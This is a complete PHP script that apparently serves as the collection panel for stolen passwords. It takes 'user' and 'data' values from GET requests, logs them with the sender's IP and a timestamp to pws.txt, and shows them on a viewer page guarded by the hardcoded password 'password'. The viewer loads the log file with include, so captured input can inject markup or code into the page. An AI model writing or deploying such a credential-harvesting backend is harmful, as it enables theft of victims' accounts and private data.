<?php


  $view_pass = "password"; // Password
  $length = 10000; //keep only the last 10000 entries 
  $ctrl_file = "pws.txt"; 


function deletefile($ourFileName)
{
$ourFileHandle = fopen($ourFileName, 'w') or die("can't open file");
fclose($ourFileHandle); 
unlink($ourFileName); 	
}



  $action = $_GET['action'];

   
   if ($action == "clear"){
   if ($view_pass != ""){
     $pass = $_GET['pass']; 
   if ($pass == $view_pass) {
   deletefile($ctrl_file);
   ?>
<html>

  <head>      
    <title>Passwords Logs</title>
 
  </head>
  
<body bgcolor="#000080" text="#FFFFFF">
      
    <h1>List Cleared Succefully</h1>
    <hr>
    <font size="3">You Have Cleared the Passwords List</font>
  </body>
</html>
<?
exit;
}
}

   }  
     
   
  if ($action == "log"){     
    $datatime = date("H:i:s m/d/y");
    $daip = $_SERVER['REMOTE_ADDR'];
 
    $n_file_arry = array();
    $user = $_GET['user'];
    $data = $_GET['data']; 


    
    $n_file_arry[0] = "<tr><td>$datatime</td><td>$daip</td><td>$user</td><td>$data</td></tr>\r\n";
  
    $file_arry = file($ctrl_file);
    $counter = 0;

    while (list($key,$val) = each($file_arry)) {
      if ($val != ""){
        if ($key == $length-1) break;
        $n_file_arry[$key+1] = $val;
      }
    }

    $fp = fopen("$ctrl_file", "w");
    fputs($fp, join("",$n_file_arry));
    fclose($fp);
    exit;
  } else {
    if ($view_pass != ""){
      $pass = $_GET['pass'];
      if ($pass != $view_pass){
?>
<html>
  <head>      
    <title>403 Forbidden</title>
  </head>
 <body bgcolor="#000080" text="#FFFFFF">
    <h1>403 Forbidden</h1>
    <hr>
    <font size="3">You are not authorized to view this page</font>
  </body>
</html>
<?
      exit;
      }
    }
    $datatime = date("H:i:s m/d/y");
    $servertime = "Current Server Time: $datatime";
    if (!file_exists($ctrl_file)) {
      $servertime .= "<br><font color=\"#DD0000\">\"WARNING: $ctrl_file not found!\"</font>";
      fclose(fopen("$ctrl_file", "w"));
    }
  }
?>
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
    <title>Passwords Logs</title>
  <style>
  <!--
    table {
          font-size: 10pt;
          font-family: tahoma;
          border: 1px solid #666666;
	  background-color: #F8FEED;
	  filter: alpha(opacity=90);
	  padding: 5px;
          width: 100%;
	  margin: 0px auto;
          align: center;
          }
    td {
       border: 1px solid #CDCDCD;   
       }
    body {
         font-size: 10pt;
         font-family: tahoma;
         background: #333399;
	 margin: 3px;
	 scrollbar-face-color: #ffffff; 	 	
         scrollbar-shadow-color: #f4f4f4; 	
	 scrollbar-highlight-color: #f4f4f4; 	
	 scrollbar-3dlight-color: #ffffff; 	
	 scrollbar-darkshadow-color: #ffffff; 	
	 scrollbar-track-color: #ffffff; 	
	 scrollbar-arrow-color: #f4f4f4
         }
    .hand {cursor:hand}
  -->
  </style>
  
  </head>
  
  <body bgcolor="#FFFFFF">
    <div align="center">
      <p>&nbsp;<h2>Passwords Logs</h2>
      &lt;<?php echo $servertime; ?><br><br>
      <table width="2000">
        <tr>
          <td width="5%"><strong>Logged Time</strong></td>
          <td width="5%"><strong>IP</strong></td>
          <td width="5%"><strong>USER</strong></td>
          <td width="1400"><strong>DATA</strong></td>
      
        </tr>
        <?php @include $ctrl_file; ?>
      </table>
      <br>
    </div>
  </body>
</html>
